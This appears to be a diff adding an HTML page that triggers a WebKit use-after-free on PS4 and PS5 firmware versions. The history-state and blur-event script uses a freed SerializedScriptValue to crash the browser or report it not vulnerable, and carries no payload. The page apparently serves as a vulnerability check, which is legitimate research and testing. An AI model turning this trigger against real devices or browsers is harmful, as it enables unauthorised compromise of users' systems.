@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<title>PS4 FWs 10.00-11.02 and PS5 FWs 6.00-8.60</title>
+<body>
+
+<h1>My First JavaScript</h1>
+
+<script>
+
+input = document.body.appendChild(document.createElement('input'));
+
+foo = document.body.appendChild(document.createElement('a'));
+foo.id = 'foo';
+
+function pop(event) {
+    alert('you get a crash after you close this alert');
+    event.state; // use the freed SerializedScriptValue
+    alert('WebKit version not vulnerable');
+}
+
+addEventListener('popstate', pop);
+
+history.pushState('state1', '', location + '#foo'); // URL with a hash
+history.pushState('state2', '');
+
+setTimeout(() => {
+    input.focus();
+    input.onblur = () => {
+        history.replaceState('state3', '')
+    };
+    setTimeout(() => {
+        history.back(); // trigger loadInSameDocument()
+    }, 1000);
+}, 1000);
+
+</script>
+
+
+
+</body>
+</html> 
